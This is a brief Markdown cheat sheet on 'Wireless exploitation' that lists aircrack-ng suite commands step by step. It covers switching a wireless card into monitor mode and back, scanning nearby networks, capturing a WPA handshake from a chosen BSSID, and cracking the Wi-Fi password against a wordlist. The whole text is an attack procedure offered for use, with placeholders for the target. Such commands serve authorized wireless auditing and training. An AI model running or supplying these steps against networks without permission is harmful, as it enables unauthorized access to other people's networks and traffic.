# Wireless exploitation

## Summary
* [Wifi hacking](#wifi-hacking)
	* [Managed to Monitor mode](#set-network-device-to-monitor-mode)
	* [Monitor to Managed mode](#set-network-device-to-managed-mode)
	* [List all available network](#list-all-available-network)
	* [Capture network handshakes](#capture-network-handshake)
	* [Crack Wifi password](#crack-wifi-password)

## Wifi hacking
### Set network device to monitor mode
```
-> ifconfig wlan0 down
-> iwconfig wlan0 mode monitor
-> ifconfig wlan0 up
-> airmon-ng start <network device>
```
### Set network device to managed mode
```
-> ifconfig wlan0 down
-> iwconfig wlan0 mode managed
-> ifconfig wlan0 up
```
### List all available network
```
airodump-ng <network device>
```
### Capture network handshake
```
airodump-ng -c <channel> -d <bssid> -w <save file> <network device>
```
### Crack Wifi password
```
aircrack-ng -w <wordlist> -b <bssid> <packet file> 
```
